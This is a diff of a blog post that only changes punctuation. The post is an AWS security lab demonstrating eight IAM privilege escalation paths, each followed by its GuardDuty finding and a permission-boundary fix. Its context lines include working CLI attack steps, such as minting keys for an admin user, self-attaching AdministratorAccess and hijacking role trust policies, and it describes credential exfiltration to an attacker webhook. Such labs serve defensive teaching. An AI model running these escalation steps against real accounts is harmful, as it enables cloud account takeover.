@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Lab — IAM Privilege Escalation: 8 Paths from Low-Privilege to Admin"
+title: "Lab: IAM Privilege Escalation: 8 Paths from Low-Privilege to Admin"
 date: 2026-06-24T10:00:00
 categories:
   - AWS Security Labs
@@ -15,7 +15,7 @@ tags:
   - cloud-attack
   - lab
 author: muhammed
-description: A hands-on lab demonstrating 8 documented IAM privilege escalation paths — from a low-privilege identity to full AdministratorAccess — and how to detect each one with GuardDuty and Access Analyzer, then fix them with permission boundaries.
+description: A hands-on lab demonstrating 8 documented IAM privilege escalation paths - from a low-privilege identity to full AdministratorAccess - and how to detect each one with GuardDuty and Access Analyzer, then fix them with permission boundaries.
 toc: true
 pin: false
 math: false
@@ -37,22 +37,22 @@ Fix everything with permission boundaries.
 
 ## Why IAM Privesc Is the Most Critical Cloud Attack Surface
 
-In the first two labs you stole IAM credentials — from a shell and from a browser.
+In the first two labs you stole IAM credentials - from a shell and from a browser.
 This lab answers what happens next.
 
 A stolen credential is only as dangerous as the permissions attached to it.
 A developer with S3 read access is low risk.
-But if that developer has one extra permission — like `iam:AttachUserPolicy` — they can grant themselves `AdministratorAccess` in a single API call.
+But if that developer has one extra permission - like `iam:AttachUserPolicy` - they can grant themselves `AdministratorAccess` in a single API call.
 
 There are **21 documented IAM privilege escalation paths**.
 Each one is a single misconfigured permission that collapses the entire IAM model.
-You don't need to be an admin to become one — you just need the right wrong permission.
+You don't need to be an admin to become one - you just need the right wrong permission.
 
 ---
 
 ## Attack Mindset: The Three Questions
 
-When you land on any AWS identity — stolen credentials, assumed role, EC2 instance profile — ask three questions in order:
+When you land on any AWS identity - stolen credentials, assumed role, EC2 instance profile - ask three questions in order:
 
 ```
 1. What can I SEE?     → enumerate permissions, list resources
@@ -60,14 +60,14 @@ When you land on any AWS identity — stolen credentials, assumed role, EC2 inst
 3. What can I BECOME?  → find a path from current permissions to admin
 ```
 
-This lab covers question 3 — the escalation paths.
+This lab covers question 3 - the escalation paths.
 
 ---
 
 ## Lab Architecture
 
-You will create one IAM user with intentionally misconfigured permissions — one path per section.
-Each section is independent — you can do them in any order.
+You will create one IAM user with intentionally misconfigured permissions - one path per section.
+Each section is independent - you can do them in any order.
 
 ```
 Lab IAM User: "lab-developer"
@@ -84,15 +84,15 @@ Lab IAM User: "lab-developer"
 
 ---
 
-## Phase 0 — Setup
+## Phase 0: Setup
 
-### Step 0.1 — Enable GuardDuty
+### Step 0.1: Enable GuardDuty
 
 ```bash
 aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES
 ```
 
-### Step 0.2 — Create a Target Admin User (the victim of Path 1)
+### Step 0.2: Create a Target Admin User (the victim of Path 1)
 
 ```bash
 aws iam create-user --user-name admin-alice
@@ -101,10 +101,10 @@ aws iam attach-user-policy \
   --user-name admin-alice \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 
-# Alice has no access keys yet — that's the vulnerability
+# Alice has no access keys yet: that's the vulnerability
 ```
 
-### Step 0.3 — Create an Admin Group (the target for Path 4)
+### Step 0.3: Create an Admin Group (the target for Path 4)
 
 ```bash
 aws iam create-group --group-name admin-group
@@ -114,10 +114,10 @@ aws iam attach-group-policy \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
-### Step 0.4 — Create a Managed Policy with Multiple Versions (for Path 5)
+### Step 0.4: Create a Managed Policy with Multiple Versions (for Path 5)
 
 ```bash
-# Version 1 — permissive (the "old" version)
+# Version 1: permissive (the "old" version)
 aws iam create-policy \
   --policy-name developer-policy \
   --policy-document '{
@@ -127,7 +127,7 @@ aws iam create-policy \
     ]
   }'
 
-# Version 2 — restricted (current default version)
+# Version 2: restricted (current default version)
 aws iam create-policy-version \
   --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developer-policy \
   --policy-document '{
@@ -138,10 +138,10 @@ aws iam create-policy-version \
   }' \
   --set-as-default
 
-# Version 1 still exists — it's not the default, but it's there
+# Version 1 still exists: it's not the default, but it's there
 ```
 
-### Step 0.5 — Create an Admin Role (target for Paths 6, 7, 8)
+### Step 0.5: Create an Admin Role (target for Paths 6, 7, 8)
 
 ```bash
 cat > admin-role-trust.json << 'EOF'
@@ -164,7 +164,7 @@ aws iam attach-role-policy \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
-### Step 0.6 — Create the Low-Privilege Attacker User
+### Step 0.6: Create the Low-Privilege Attacker User
 
 ```bash
 aws iam create-user --user-name lab-developer
@@ -180,12 +180,12 @@ aws configure --profile attacker
 # Enter the lab-developer access key and secret
 ```
 
-Verify the starting position — very limited:
+Verify the starting position - very limited:
 
 ```bash
 aws sts get-caller-identity --profile attacker
 aws iam list-users --profile attacker
-# AccessDenied — the user has no permissions yet
+# AccessDenied: the user has no permissions yet
 ```
 
 Each path below adds one specific permission to `lab-developer` and then exploits it.
@@ -194,9 +194,9 @@ Each path below adds one specific permission to `lab-developer` and then exploit
 
 ---
 
-## Path 1 — `iam:CreateAccessKey`
+## Path 1: `iam:CreateAccessKey`
 
-**What it is:** Create new permanent access keys for any IAM user — including admins.
+**What it is:** Create new permanent access keys for any IAM user - including admins.
 
 ### Give the Attacker This Permission
 
@@ -217,7 +217,7 @@ aws iam put-user-policy \
 ### Exploit It
 
 ```bash
-# Create a new access key for admin-alice — she has AdministratorAccess
+# Create a new access key for admin-alice: she has AdministratorAccess
 aws iam create-access-key \
   --user-name admin-alice \
   --profile attacker
@@ -259,9 +259,9 @@ Creating access keys for other users is flagged as anomalous persistence.
 
 ---
 
-## Path 2 — `iam:AttachUserPolicy`
+## Path 2: `iam:AttachUserPolicy`
 
-**What it is:** Attach any managed policy to any user — including attaching `AdministratorAccess` to yourself.
+**What it is:** Attach any managed policy to any user - including attaching `AdministratorAccess` to yourself.
 
 ### Give the Attacker This Permission
 
@@ -288,7 +288,7 @@ aws iam attach-user-policy \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
   --profile attacker
 
-# You are now admin — verify
+# You are now admin: verify
 aws iam list-roles --profile attacker
 aws ec2 describe-instances --profile attacker
 ```
@@ -314,9 +314,9 @@ PrivilegeEscalation:IAMUser/AnomalousBehavior
 
 ---
 
-## Path 3 — `iam:PutUserPolicy`
+## Path 3: `iam:PutUserPolicy`
 
-**What it is:** Write an inline policy directly to any user — bypassing managed policy restrictions.
+**What it is:** Write an inline policy directly to any user - bypassing managed policy restrictions.
 
 ### Give the Attacker This Permission
 
@@ -351,7 +351,7 @@ aws iam put-user-policy \
   }' \
   --profile attacker
 
-# Full admin — everything is now allowed
+# Full admin: everything is now allowed
 aws iam list-users --profile attacker
 ```
 
@@ -362,13 +362,13 @@ aws iam list-users --profile attacker
 PrivilegeEscalation:IAMUser/AnomalousBehavior
 ```
 
-**Fix:** Same as Path 2 — treat `iam:PutUserPolicy` as equivalent to admin access. Never grant it to end users without permission boundaries.
+**Fix:** Same as Path 2 - treat `iam:PutUserPolicy` as equivalent to admin access. Never grant it to end users without permission boundaries.
 
 ---
 
-## Path 4 — `iam:AddUserToGroup`
+## Path 4: `iam:AddUserToGroup`
 
-**What it is:** Add yourself to any group — including an admin group with `AdministratorAccess`.
+**What it is:** Add yourself to any group - including an admin group with `AdministratorAccess`.
 
 ### Give the Attacker This Permission
 
@@ -400,7 +400,7 @@ aws iam add-user-to-group \
 
 # Wait a few seconds for the policy to propagate, then verify
 aws iam list-users --profile attacker
-# Now succeeds — you inherited AdministratorAccess from the group
+# Now succeeds: you inherited AdministratorAccess from the group
 ```
 
 > 📸 **SCREENSHOT:** `aws iam list-groups` showing admin-group, then `aws iam add-user-to-group` succeeding
@@ -414,9 +414,9 @@ PrivilegeEscalation:IAMUser/AnomalousBehavior
 
 ---
 
-## Path 5 — `iam:SetDefaultPolicyVersion`
+## Path 5: `iam:SetDefaultPolicyVersion`
 
-**What it is:** Change which version of a managed policy is active — if an older version has broader permissions, roll back to it.
+**What it is:** Change which version of a managed policy is active - if an older version has broader permissions, roll back to it.
 
 ### Give the Attacker This Permission
 
@@ -452,7 +452,7 @@ aws iam attach-user-policy \
 ### Exploit It
 
 ```bash
-# List all versions of the policy — find the permissive one
+# List all versions of the policy: find the permissive one
 aws iam list-policy-versions \
   --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developer-policy \
   --profile attacker
@@ -470,13 +470,13 @@ Output:
 ```
 
 ```bash
-# Roll back to v1 — the wildcard allow-all version
+# Roll back to v1: the wildcard allow-all version
 aws iam set-default-policy-version \
   --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developer-policy \
   --version-id v1 \
   --profile attacker
 
-# developer-policy now allows Action:* Resource:* — full admin
+# developer-policy now allows Action:* Resource:*: full admin
 aws iam list-users --profile attacker
 ```
 
@@ -487,16 +487,16 @@ aws iam list-users --profile attacker
 PrivilegeEscalation:IAMUser/AnomalousBehavior
 ```
 
-**Fix:** Delete old policy versions — never leave permissive versions sitting unused. AWS allows max 5 versions; automate deletion of old ones in your CI/CD pipeline.
+**Fix:** Delete old policy versions - never leave permissive versions sitting unused. AWS allows max 5 versions; automate deletion of old ones in your CI/CD pipeline.
 
 ---
 
-## Path 6 — `iam:PassRole` + `ec2:RunInstances`
+## Path 6: `iam:PassRole` + `ec2:RunInstances`
 
 **What it is:** Launch an EC2 instance with an admin IAM role attached.
 Access the instance and steal the admin credentials via IMDS.
 
-This path chains two permissions that seem harmless individually — but together grant admin access.
+This path chains two permissions that seem harmless individually - but together grant admin access.
 
 ### Give the Attacker This Permission
 
@@ -543,7 +543,7 @@ aws ec2 run-instances \
 
 The EC2 instance starts, fetches its own admin IAM credentials from IMDS, and POSTs them to the attacker's webhook.
 
-No direct shell access needed — the user-data script does the exfiltration at boot.
+No direct shell access needed - the user-data script does the exfiltration at boot.
 
 > 📸 **SCREENSHOT:** EC2 instance launched with the admin role, and the attacker receiving the credentials via webhook
 
@@ -564,14 +564,14 @@ UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
   }
 }
 ```
-Better — use permission boundaries on all roles to prevent admin roles from being passed to compute.
+Better - use permission boundaries on all roles to prevent admin roles from being passed to compute.
 
 ---
 
-## Path 7 — `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`
+## Path 7: `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`
 
 **What it is:** Create a Lambda function with an admin execution role.
-Invoke it — the function runs as admin and can exfiltrate credentials or make admin API calls.
+Invoke it - the function runs as admin and can exfiltrate credentials or make admin API calls.
 
 ### Give the Attacker This Permission
 
@@ -622,7 +622,7 @@ aws lambda create-function \
   --zip-file fileb://lambda.zip \
   --profile attacker
 
-# Invoke it — it runs as the admin role
+# Invoke it: it runs as the admin role
 aws lambda invoke \
   --function-name privesc-function \
   --payload '{}' \
@@ -630,11 +630,11 @@ aws lambda invoke \
   --profile attacker
 
 cat output.json
-# Returns: ["admin-alice", "lab-developer", ...] — full IAM user list
+# Returns: ["admin-alice", "lab-developer", ...]: full IAM user list
 # In a real attack, the function could create access keys, modify policies, etc.
 ```
 
-> 📸 **SCREENSHOT:** Lambda function created with lab-admin-role, then invoked — output showing all IAM users returned
+> 📸 **SCREENSHOT:** Lambda function created with lab-admin-role, then invoked - output showing all IAM users returned
 
 **GuardDuty finding:**
 ```
@@ -645,7 +645,7 @@ PrivilegeEscalation:IAMUser/AnomalousBehavior
 
 ---
 
-## Path 8 — `iam:UpdateAssumeRolePolicy`
+## Path 8: `iam:UpdateAssumeRolePolicy`
 
 **What it is:** Modify a role's trust policy to add yourself as a trusted principal.
 Then assume the role directly.
@@ -708,7 +708,7 @@ aws sts assume-role \
   --profile attacker
 ```
 
-Output — you receive admin credentials:
+Output - you receive admin credentials:
 
 ```json
 {
@@ -730,7 +730,7 @@ export AWS_SECRET_ACCESS_KEY=...
 export AWS_SESSION_TOKEN=...
 
 aws iam list-users
-# Full admin — all users listed
+# Full admin: all users listed
 ```
 
 > 📸 **SCREENSHOT:** Trust policy updated, then `aws sts assume-role` returning admin credentials, then `aws iam list-users` succeeding
@@ -743,7 +743,7 @@ Persistence:IAMUser/AnomalousBehavior
 
 ---
 
-## Phase — Automate Discovery with Pacu
+## Phase: Automate Discovery with Pacu
 
 Doing this manually works for a lab.
 In a real engagement, use **Pacu** to scan all 21 paths automatically:
@@ -783,7 +783,7 @@ Output:
 
 ---
 
-## Phase — Detect with IAM Access Analyzer
+## Phase: Detect with IAM Access Analyzer
 
 GuardDuty fires after the escalation happens.
 Access Analyzer catches the permission misconfigurations before they are exploited.
@@ -807,7 +807,7 @@ aws accessanalyzer validate-policy \
   --policy-type IDENTITY_POLICY
 ```
 
-Access Analyzer flags this as a **security warning** — `iam:AttachUserPolicy` with `Resource: *` is a known escalation risk.
+Access Analyzer flags this as a **security warning** - `iam:AttachUserPolicy` with `Resource: *` is a known escalation risk.
 
 ```bash
 # Check unused access findings (users/roles with dangerous permissions they're not using)
@@ -819,14 +819,14 @@ aws accessanalyzer list-findings \
 
 ---
 
-## Phase — Fix with Permission Boundaries
+## Phase: Fix with Permission Boundaries
 
-A **permission boundary** is a managed policy attached to a user or role that sets the maximum permissions it can ever have — regardless of what policies are attached to it.
+A **permission boundary** is a managed policy attached to a user or role that sets the maximum permissions it can ever have - regardless of what policies are attached to it.
 
 Even if `lab-developer` grants themselves `AdministratorAccess`, the permission boundary caps what they can actually do.
 
 ```bash
-# Create a permission boundary — developer can do S3 and EC2, nothing else
+# Create a permission boundary: developer can do S3 and EC2, nothing else
 aws iam create-policy \
   --policy-name developer-permission-boundary \
   --policy-document '{
@@ -853,7 +853,7 @@ aws iam put-user-permissions-boundary \
 Now test Path 2 again:
 
 ```bash
-# Escalation attempt — attaches AdministratorAccess
+# Escalation attempt: attaches AdministratorAccess
 aws iam attach-user-policy \
   --user-name lab-developer \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
@@ -861,7 +861,7 @@ aws iam attach-user-policy \
 
 # Try to use admin access
 aws iam list-users --profile attacker
-# AccessDenied — permission boundary blocks it even though AdministratorAccess is attached
+# AccessDenied: permission boundary blocks it even though AdministratorAccess is attached
 ```
 
 The policy is attached.
@@ -874,13 +874,13 @@ Effective permissions = Identity Policies ∩ Permission Boundary
 (AdministratorAccess) ∩ (S3, EC2 describe, CloudWatch) = S3, EC2 describe, CloudWatch
 ```
 
-The attacker escalated on paper — but gained nothing in practice.
+The attacker escalated on paper - but gained nothing in practice.
 
-> 📸 **SCREENSHOT:** `aws iam list-users` returning AccessDenied even after AdministratorAccess was successfully attached — proving the permission boundary works
+> 📸 **SCREENSHOT:** `aws iam list-users` returning AccessDenied even after AdministratorAccess was successfully attached - proving the permission boundary works
 
 ---
 
-## All 21 Paths — Quick Reference
+## All 21 Paths: Quick Reference
 
 ```
 Direct policy manipulation (escalates immediately):
@@ -983,11 +983,11 @@ aws guardduty delete-detector --detector-id YOUR_DETECTOR_ID
 
 ## Key Takeaways
 
-- A single misconfigured permission can collapse your entire IAM model — the gap between low-privilege and admin can be one API call
-- The most dangerous permissions in IAM are not `s3:DeleteObject` or `ec2:TerminateInstances` — they are `iam:AttachUserPolicy`, `iam:PutUserPolicy`, and `iam:PassRole`
-- Permission boundaries are the correct defense — they cap what an identity can do regardless of what policies get attached
-- Access Analyzer catches these before exploitation — run policy validation in your CI/CD pipeline
-- GuardDuty catches them during exploitation — but at that point the escalation has already happened; detection must trigger an immediate automated response
+- A single misconfigured permission can collapse your entire IAM model - the gap between low-privilege and admin can be one API call
+- The most dangerous permissions in IAM are not `s3:DeleteObject` or `ec2:TerminateInstances` - they are `iam:AttachUserPolicy`, `iam:PutUserPolicy`, and `iam:PassRole`
+- Permission boundaries are the correct defense - they cap what an identity can do regardless of what policies get attached
+- Access Analyzer catches these before exploitation - run policy validation in your CI/CD pipeline
+- GuardDuty catches them during exploitation - but at that point the escalation has already happened; detection must trigger an immediate automated response
 
 ---
 
